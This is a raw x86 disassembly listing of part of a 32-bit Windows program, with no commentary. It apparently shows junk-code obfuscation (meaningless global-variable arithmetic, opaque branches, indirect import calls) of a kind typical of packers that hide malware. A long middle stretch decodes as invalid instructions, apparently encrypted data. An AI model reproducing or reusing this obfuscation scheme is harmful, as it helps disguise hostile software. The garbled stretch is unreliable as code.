  418f0c:	push   0x428367
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428e34
  418f1a:	not    DWORD PTR ds:0x4281db
  418f20:	sub    DWORD PTR ds:0x4283cf,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428193
  418f32:	mov    edx,DWORD PTR ds:0x4282d7
  418f38:	sbb    DWORD PTR ds:0x4283bb,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428313
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42834b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x4283cf,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283e3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x42833b,0x0
  418f6c:	not    DWORD PTR ds:0x4282a7
  418f72:	not    DWORD PTR ds:0x4281d7
  418f78:	mov    DWORD PTR ds:0x42832f,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42835f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x42833b,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x4283bb
  418fb5:	call   DWORD PTR ds:0x428e38
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42826f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x4281cf
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x4283bf,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x4281cb,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x4281af,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42819f,0x0
  41900e:	mov    DWORD PTR ds:0x4281b3,0x4347
  419018:	mov    DWORD PTR ds:0x4281d7,0x6064
  419022:	mov    DWORD PTR ds:0x4282bf,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428293,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42819f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428e3c
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x42832f
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42826b
  41906c:	or     DWORD PTR ds:0x4283af,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0xc8f3402]
  419095:	ror    bh,1
  419097:	jo     0x4190d8
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1+0x561818],bh
  4190a2:	stc    
  4190a3:	xor    BYTE PTR ds:0xc296b093,dl
  4190a9:	cdq    
  4190aa:	mov    WORD PTR [edi],es
  4190ac:	mov    bh,0x2b
  4190ae:	jl     0x4190d2
  4190b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190b1:	adc    eax,0x194d9508
  4190b6:	cmp    ah,bl
  4190b8:	repnz test eax,0x112dcc8d
  4190be:	lahf   
  4190bf:	cmp    bl,dh
  4190c1:	(bad)  
  4190c2:	into   
  4190c3:	xor    BYTE PTR [eax],bh
  4190c5:	lods   eax,DWORD PTR ds:[esi]
  4190c6:	(bad)  
  4190c7:	fsub   DWORD PTR [eax+0x363acd57]
  4190cd:	pop    esi
  4190ce:	cwde   
  4190cf:	dec    esp
  4190d0:	jne    0x4190e4
  4190d2:	test   eax,0xaf318cb2
  4190d7:	push   ebp
  4190d8:	mov    DWORD PTR [ebx+0x65],eax
  4190db:	(bad)  
  4190dc:	jecxz  0x41913b
  4190de:	jno    0x4190b0
  4190e0:	retf   
  4190e1:	call   edi
  4190e3:	mov    edx,0x1b7f44cb
  4190e8:	xor    ebx,eax
  4190ea:	out    dx,eax
  4190eb:	inc    eax
  4190ec:	xor    DWORD PTR [edx+edx*2],ecx
  4190ef:	fiadd  WORD PTR [edi-0x5c314279]
  4190f5:	mov    ds:0x7e35b29d,al
  4190fa:	shl    bh,1
  4190fc:	bound  esp,QWORD PTR [ecx-0x64]
  4190ff:	rcl    DWORD PTR [esi+0x7c181cd7],1
  419105:	icebp  
  419106:	ins    DWORD PTR es:[edi],dx
  419107:	or     esp,DWORD PTR [ebx+0x26bee7c]
  41910d:	adc    esi,DWORD PTR [esi-0x4c1fe6c6]
  419113:	mov    ch,0x4f
  419115:	rcl    BYTE PTR [esi],cl
  419117:	stos   BYTE PTR es:[edi],al
  419118:	retf   
  419119:	adc    al,0xbd
  41911b:	retf   
  41911c:	xchg   esp,eax
  41911d:	xchg   edi,eax
  41911e:	xor    eax,0x366a2e4e
  419123:	call   0x98e8:0x9442e2f8
  41912a:	and    DWORD PTR [esi-0x76d6ee28],esp
  419130:	test   eax,0xc17d4757
  419135:	push   edi
  419136:	(bad)  
  419137:	stos   DWORD PTR es:[edi],eax
  419138:	repz and esp,DWORD PTR [edx]
  41913b:	ror    BYTE PTR [ebp-0x42a5b7fa],1
  419141:	and    dh,dh
  419143:	xchg   edx,eax
  419144:	add    BYTE PTR [ecx],cl
  419146:	mov    esi,0x5dc5cbd7
  41914b:	gs xchg esp,eax
  41914d:	add    al,0xd7
  41914f:	sub    DWORD PTR [edi-0x6a],ebx
  419152:	sbb    al,0x79
  419154:	and    al,0xbf
  419156:	ds in  al,dx
  419158:	or     BYTE PTR [eax],al
  41915a:	pop    esi
  41915b:	add    al,0x39
  41915d:	pop    edx
  41915e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419160:	or     eax,0x9a0c7cd3
  419165:	sub    ebx,ebp
  419167:	adc    eax,0x2cc966d8
  41916c:	loopne 0x41910f
  41916e:	sbb    esi,edx
  419170:	call   0xfaa:0x84f1323
  419177:	jbe    0x41916b
  419179:	loopne 0x41910e
  41917b:	out    0x22,eax
  41917d:	xor    eax,0xefb84849
  419182:	adc    DWORD PTR [esi],ebp
  419184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419185:	repnz test eax,0x69b0e91f
  41918b:	inc    ecx
  41918c:	jge    0x4191d1
  41918e:	outs   dx,BYTE PTR ds:[esi]
  41918f:	jbe    0x419194
  419191:	adc    eax,0x1f2525ea
  419196:	test   al,0xc4
  419198:	out    dx,eax
  419199:	in     al,dx
  41919a:	popa   
  41919b:	pop    ss
  41919c:	pop    ebp
  41919d:	lahf   
  41919e:	into   
  41919f:	pop    ecx
  4191a0:	add    BYTE PTR [ebp+0x7d],bl
  4191a3:	push   ss
  4191a4:	lods   al,BYTE PTR ds:[esi]
  4191a5:	jbe    0x419195
  4191a7:	lahf   
  4191a8:	adc    al,bh
  4191aa:	test   DWORD PTR [esi],ecx
  4191ac:	add    eax,0x5d31e151
  4191b1:	out    dx,eax
  4191b2:	inc    edx
  4191b3:	daa    
  4191b4:	push   edx
  4191b5:	jmp    0x419182
  4191b7:	mov    bl,0xca
  4191b9:	jl     0x4191fe
  4191bb:	add    eax,0x31c8f4f7
  4191c0:	xchg   ecx,eax
  4191c1:	call   0x1eab4d73
  4191c6:	mov    al,ds:0x8b7aba6c
  4191cb:	inc    ebp
  4191cc:	push   0x3a836c4d
  4191d1:	enter  0x437e,0x70
  4191d5:	mov    edi,0x356dbcb9
  4191da:	push   esp
  4191db:	cmp    BYTE PTR [ebx],bl
  4191dd:	lahf   
  4191de:	popa   
  4191df:	push   esp
  4191e0:	push   esp
  4191e1:	sbb    DWORD PTR [eax+0x14],edx
  4191e4:	pop    es
  4191e5:	test   esp,edx
  4191e7:	out    0x47,al
  4191e9:	stos   BYTE PTR es:[edi],al
  4191ea:	sub    ecx,DWORD PTR [edx-0x5]
  4191ed:	jno    0x4191ec
  4191ef:	test   eax,0x6e5f691a
  4191f4:	push   es
  4191f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191f6:	inc    esi
  4191f7:	sar    dl,1
  4191f9:	fsubr  st,st(1)
  4191fb:	jnp    0x4191cb
  4191fd:	jnp    0x4191d5
  4191ff:	or     DWORD PTR [eax+0x64d74e1d],esp
  419205:	or     DWORD PTR [ecx+0x1c81a239],0x2280f2b6
  41920f:	std    
  419210:	adc    al,0xcb
  419212:	out    0x74,al
  419214:	fist   WORD PTR ds:0x49430fe2
  41921a:	pop    esp
  41921b:	test   eax,0x62a6ec91
  419220:	ret    0x4976
  419223:	jo     0x4191fe
  419225:	pop    ebp
  419226:	pop    eax
  419227:	std    
  419228:	in     eax,0xe
  41922a:	popf   
  41922b:	xchg   ebx,eax
  41922c:	xchg   BYTE PTR [ebp+0xe],dh
  41922f:	data16 clc 
  419231:	inc    ebp
  419232:	pushf  
  419233:	mov    esi,0xfddc67b3
  419238:	adc    dl,BYTE PTR [ecx-0x36]
  41923b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41923d:	lahf   
  41923e:	cmp    DWORD PTR [esi+0x66],eax
  419241:	mov    al,ds:0x5c73f48c
  419246:	std    
  419247:	(bad)  
  419248:	jb     0x4191fe
  41924a:	repnz push ss
  41924c:	pop    esp
  41924d:	cmp    al,0xd2
  41924f:	or     esi,DWORD PTR [edi]
  419251:	call   0x6d1d:0xea8dc91a
  419258:	jg     0x419259
  41925a:	xchg   ebx,eax
  41925b:	ret    
  41925c:	jge    0x4192c4
  41925e:	inc    edi
  41925f:	and    al,0x4f
  419261:	jne    0x4192e0
  419263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419264:	lock dec ecx
  419266:	jmp    0xacc890d7
  41926b:	ficomp DWORD PTR [ecx-0x4accfdd6]
  419271:	rol    DWORD PTR [ebp-0x4],0xe
  419275:	cmp    al,0x20
  419277:	fild   DWORD PTR [edx]
  419279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927a:	pop    esp
  41927b:	mov    ah,0xe
  41927d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41927e:	mov    ch,0x15
  419280:	dec    esi
  419281:	addr16 mov ebp,0x9bb3924f
  419287:	(bad)  
  419288:	outs   dx,BYTE PTR ds:[esi]
  419289:	repz or eax,0xaa81ac35
  41928f:	daa    
  419290:	jle    0x41930f
  419292:	repz jecxz 0x4192a9
  419295:	shl    DWORD PTR [ecx+ebx*8-0x38],1
  419299:	fsubr  QWORD PTR [edi-0x6f]
  41929c:	sbb    eax,0x1daff884
  4192a1:	imul   esp,esi,0x6fa9be59
  4192a7:	jno    0x41929b
  4192a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192aa:	pop    ecx
  4192ab:	std    
  4192ac:	cli    
  4192ad:	mov    al,ds:0xa87f7bed
  4192b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b3:	bound  edi,QWORD PTR [edi+0x27]
  4192b6:	mov    edi,0x471d289a
  4192bb:	out    0xe,eax
  4192bd:	cdq    
  4192be:	ret    
  4192bf:	cld    
  4192c0:	inc    eax
  4192c1:	sahf   
  4192c2:	pop    eax
  4192c3:	xor    al,BYTE PTR [ebx]
  4192c5:	cmp    esp,esi
  4192c7:	cmp    BYTE PTR [esi],ah
  4192c9:	xchg   esp,eax
  4192ca:	rol    DWORD PTR [ebp+0x7b8bc753],0xfb
  4192d1:	or     DWORD PTR [edi+0x29],0x39
  4192d5:	aaa    
  4192d6:	scas   al,BYTE PTR es:[edi]
  4192d7:	gs add al,0xce
  4192da:	adc    bl,BYTE PTR [edx+ebp*1]
  4192dd:	mov    BYTE PTR [ebx+0x246dfd2f],ah
  4192e3:	(bad)  
  4192e4:	shr    BYTE PTR [eax-0x296ed427],0xbd
  4192eb:	call   0xd5bf88a6
  4192f0:	dec    edi
  4192f1:	loop   0x419347
  4192f3:	ins    DWORD PTR es:[edi],dx
  4192f4:	dec    ecx
  4192f5:	mov    ebp,0x36de131b
  4192fa:	fnstenv [eax-0x199f5f3]
  419300:	addr16 sbb eax,0x870cc854
  419306:	push   cs
  419307:	push   ebp
  419308:	push   es
  419309:	cs leave 
  41930b:	sbb    ebp,DWORD PTR [ecx]
  41930d:	shl    BYTE PTR [edx+0x75a8c532],cl
  419313:	add    eax,0xc73fee3d
  419318:	pop    ebx
  419319:	pop    esp
  41931a:	dec    eax
  41931b:	mov    cl,0xe6
  41931d:	mov    dh,0x45
  41931f:	inc    esp
  419320:	and    BYTE PTR [esp+edx*8-0xc],dl
  419324:	pusha  
  419325:	stc    
  419326:	pop    eax
  419327:	dec    edi
  419328:	jb     0x4192df
  41932a:	or     eax,0x440d6c1e
  41932f:	sbb    eax,DWORD PTR [esi-0x37]
  419332:	sbb    al,BYTE PTR [edx-0x268716b]
  419338:	rcl    DWORD PTR [eax+0x15],cl
  41933b:	(bad)  
  41933c:	sub    al,0x2
  41933e:	or     cl,cl
  419340:	jb     0x419346
  419342:	and    BYTE PTR ds:0xfcef94fa,dh
  419348:	adc    BYTE PTR [ecx],0x8
  41934b:	jp     0x41939a
  41934d:	mov    ds:0x7d6aad19,al
  419352:	or     ch,ch
  419354:	repnz clc 
  419356:	cwde   
  419357:	nop
  419358:	add    DWORD PTR [esi+0x19],esi
  41935b:	jb     0x419395
  41935d:	data16 test BYTE PTR [eax+0x69ea69d8],ch
  419364:	pop    eax
  419365:	in     eax,dx
  419366:	xchg   esi,eax
  419367:	mov    cl,0xcd
  419369:	lea    edx,[edx+0x2c]
  41936c:	add    DWORD PTR [esi],0xf2772413
  419372:	cmc    
  419373:	push   eax
  419374:	jg     0x4192fa
  419376:	daa    
  419377:	bound  eax,QWORD PTR [eax+esi*8+0x6c72e73e]
  41937e:	aad    0x7f
  419380:	aad    0x40
  419382:	mov    al,0x0
  419384:	mov    bh,0x6c
  419386:	fcom   QWORD PTR [edi]
  419388:	push   ebp
  419389:	add    eax,edi
  41938b:	xchg   ebx,eax
  41938c:	xor    al,0x3b
  41938e:	(bad)  
  41938f:	lock sar edi,1
  419392:	xlat   BYTE PTR ds:[ebx]
  419393:	xchg   esi,eax
  419394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419395:	or     ah,BYTE PTR [esi-0x3e]
  419398:	sub    eax,0x14c65319
  41939d:	xchg   BYTE PTR [ebx],dl
  41939f:	or     dh,BYTE PTR [ecx+ebx*8+0xf7bb347]
  4193a6:	popa   
  4193a7:	pop    ds
  4193a8:	mov    ebp,0x1b932273
  4193ad:	jne    0x419374
  4193af:	scas   eax,DWORD PTR es:[edi]
  4193b0:	outs   dx,DWORD PTR ds:[esi]
  4193b1:	sbb    cl,BYTE PTR [ecx+0x23]
  4193b4:	fwait
  4193b5:	and    eax,0xd87a0d7c
  4193ba:	mov    dl,0xb5
  4193bc:	repnz in al,dx
  4193be:	mov    ebp,0x912506ac
  4193c3:	jmp    0x41943f
  4193c5:	imul   ebp,DWORD PTR [ebx],0x9
  4193c8:	fwait
  4193c9:	xchg   ecx,eax
  4193ca:	sub    eax,0x9ebda976
  4193cf:	mov    ebp,0x590b7197
  4193d4:	loop   0x4193e8
  4193d6:	or     eax,0x3da9871e
  4193db:	cmp    al,0x6b
  4193dd:	scas   eax,DWORD PTR es:[edi]
  4193de:	and    eax,0xfe4ff4d6
  4193e3:	pop    edi
  4193e4:	leave  
  4193e5:	add    edx,DWORD PTR [eax+0x22]
  4193e8:	jns    0x419421
  4193ea:	lods   eax,DWORD PTR ds:[esi]
  4193eb:	pop    esi
  4193ec:	push   esp
  4193ed:	fnsave [edx+0x10]
  4193f0:	int3   
  4193f1:	mov    BYTE PTR es:[eax],bh
  4193f4:	imul   esi,DWORD PTR [ebx+0x62],0xffffffb6
  4193f8:	mov    ecx,0x8ffa733e
  4193fd:	xor    esi,DWORD PTR [ebp-0x38]
  419400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419401:	loop   0x419408
  419403:	sub    DWORD PTR [eax-0x45],esp
  419406:	fldenv [ecx-0x1e93e9fe]
  41940c:	stc    
  41940d:	cmp    DWORD PTR [ebp+0xe09ef30],esp
  419413:	or     ebx,0xd7f6f1db
  419419:	sub    al,BYTE PTR ds:0xea54cdeb
  41941f:	sti    
  419420:	jge    0x4193d7
  419422:	xor    BYTE PTR [ebp-0x63344148],cl
  419428:	add    BYTE PTR [eax+esi*4-0x5906fbaf],al
  41942f:	clc    
  419430:	or     eax,0x6e34963f
  419435:	leave  
  419436:	sub    BYTE PTR [eax+eax*8],al
  419439:	add    dh,0xb0
  41943c:	fs jnp 0x41944f
  41943f:	cmp    ecx,DWORD PTR [ecx-0x41]
  419442:	sbb    ebx,DWORD PTR [esi+0x3f]
  419445:	adc    DWORD PTR [ebx],0xa434db68
  41944b:	xchg   ebp,eax
  41944c:	lea    ecx,[edi]
  41944e:	fwait
  41944f:	aaa    
  419450:	jmp    0x24ce1fbd
  419455:	test   BYTE PTR [eax],al
  419457:	add    BYTE PTR [eax],al
  419459:	shrd   eax,ecx,0x2
  41945d:	cmp    DWORD PTR ds:0x42827f,0x0
  419464:	mov    DWORD PTR ds:0x4283d7,ebx
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x4283e3,0x3a28
  419482:	cmp    DWORD PTR ds:0x42827f,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428e40
  41949a:	mov    DWORD PTR ds:0x4282bb,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x428323
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x42835b,edx
  4194b2:	mov    DWORD PTR ds:0x4282e3,0x52b1
  4194bc:	or     DWORD PTR ds:0x4281bb,edx
  4194c2:	and    DWORD PTR ds:0x4283bf,ecx
  4194c8:	cmp    DWORD PTR ds:0x428367,0x0
  4194cf:	mov    DWORD PTR ds:0x428367,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x4282e3,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x4283e3,0x1b74
  4194fc:	mov    DWORD PTR ds:0x4281bf,0x3203
  419506:	cmp    DWORD PTR ds:0x428367,0x0
  41950d:	jge    0x41953e
  419513:	push   0x4280fb
  419518:	push   0x4280df
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428ed4
  419528:	adc    DWORD PTR ds:0x4281c7,0x266f
  419532:	xor    DWORD PTR ds:0x4283bf,ebx
  419538:	xor    DWORD PTR ds:0x428347,ecx
  41953e:	mov    DWORD PTR ds:0x4281b7,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428293
  41954e:	dec    DWORD PTR ds:0x428347
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x428337,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x4283cb,0x4283e7
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x4281cf,0x0
  419589:	mov    DWORD PTR ds:0x4281bf,0x514f
  419593:	mov    DWORD PTR ds:0x4281c3,0x65eb
  41959d:	mov    DWORD PTR ds:0x428273,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x4282d3,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x4281cf,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42808d
  4195cd:	push   0x4280a9
  4195d2:	call   DWORD PTR ds:0x428ed8
  4195d8:	adc    DWORD PTR ds:0x4282e7,ecx
  4195de:	and    DWORD PTR ds:0x4282db,0x4c04
  4195e8:	add    DWORD PTR ds:0x4281b3,ebx
  4195ee:	and    DWORD PTR ds:0x4282bf,0x6136
  4195f8:	add    DWORD PTR ds:0x4281c7,ebx
  4195fe:	mov    eax,ds:0x422598
  419603:	and    DWORD PTR ds:0x42834f,0x4282b7
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x4281ab,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x4281d3,0x4281a7
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x4282b7,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x4282e7,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x4282bf
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x4282d3,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x4281c3,0x428193
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x4282c7,0x42828f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x4281ab
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x4281ab,0x428337
  4196ab:	push   0x42241c
  4196b0:	sbb    DWORD PTR ds:0x4282c3,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x42826b,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x42827f
  4196da:	sbb    DWORD PTR ds:0x428363,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428293,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x4282af,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x42827b,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x4283b3,0x0
  419713:	mov    edx,DWORD PTR ds:0x42832f
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x4282ab,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x4283c3,0x5836
  419737:	cmp    DWORD PTR ds:0x4283b3,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428e44
  41974d:	movzx  edx,BYTE PTR ds:0x4281ab
  419754:	adc    DWORD PTR ds:0x428333,edx
  41975a:	movzx  edx,BYTE PTR ds:0x4282e7
  419761:	add    DWORD PTR ds:0x4281cb,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x4282df,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x4281cb,0x0
  419781:	mov    DWORD PTR ds:0x428293,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x4282ab,ebx
  419797:	cmp    DWORD PTR ds:0x4281cb,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428e48
  4197bf:	sub    DWORD PTR ds:0x4282c3,0x63b8
  4197c9:	add    DWORD PTR ds:0x42833f,0x42827f
  4197d3:	add    DWORD PTR ds:0x42829f,0x4281c7
  4197dd:	mov    ebx,DWORD PTR ds:0x4281e7
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x4282f7
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x428277,ecx
  4197f8:	and    DWORD PTR ds:0x4282cf,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x42834f
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x4281cb,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x4283b7,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x428357,0x6cf
  41984e:	mov    DWORD PTR ds:0x4283e3,0x6551
  419858:	cmp    DWORD PTR ds:0x4281cb,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428edc
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x4283eb
  419891:	mov    ecx,DWORD PTR ds:0x4283ef
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x4282db
  4198a2:	cmp    DWORD PTR ds:0x42819f,0x0
  4198a9:	mov    DWORD PTR ds:0x428193,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x42835f
  4198ba:	not    DWORD PTR ds:0x428353
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42819f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428e4c
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x4282c3
  4198e5:	and    DWORD PTR ds:0x42835b,edi
  4198eb:	mov    edx,DWORD PTR ds:0x42832f
  4198f1:	sbb    DWORD PTR ds:0x4281b7,edx
  4198f7:	or     DWORD PTR ds:0x428347,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x4282b3,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x42825f
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x428263
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x428357,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x42826b,0x4551
  419946:	mov    DWORD PTR ds:0x4282cf,0x487
  419950:	cmp    DWORD PTR ds:0x428357,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428e50
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x42832f,0x75a
  419988:	sub    DWORD PTR ds:0x4282d7,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x42827b
  419999:	sub    ecx,DWORD PTR ds:0x4283df
  41999f:	mov    DWORD PTR ds:0x42827b,ecx
  4199a5:	cmp    DWORD PTR ds:0x42829b,0x0
  4199ac:	mov    DWORD PTR ds:0x428333,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42819b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x4283b7,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42829b,edi
  4199da:	cmp    DWORD PTR ds:0x42829b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x428273
  4199ec:	push   0x427f9b
  4199f1:	call   DWORD PTR ds:0x428ee0
  4199f7:	sub    DWORD PTR ds:0x4283e7,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x42835f
  419a03:	sbb    DWORD PTR ds:0x4282e7,ecx
  419a09:	adc    edx,DWORD PTR ds:0x4283cb
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x428347,0x29fb
  419a1f:	sbb    ecx,edx
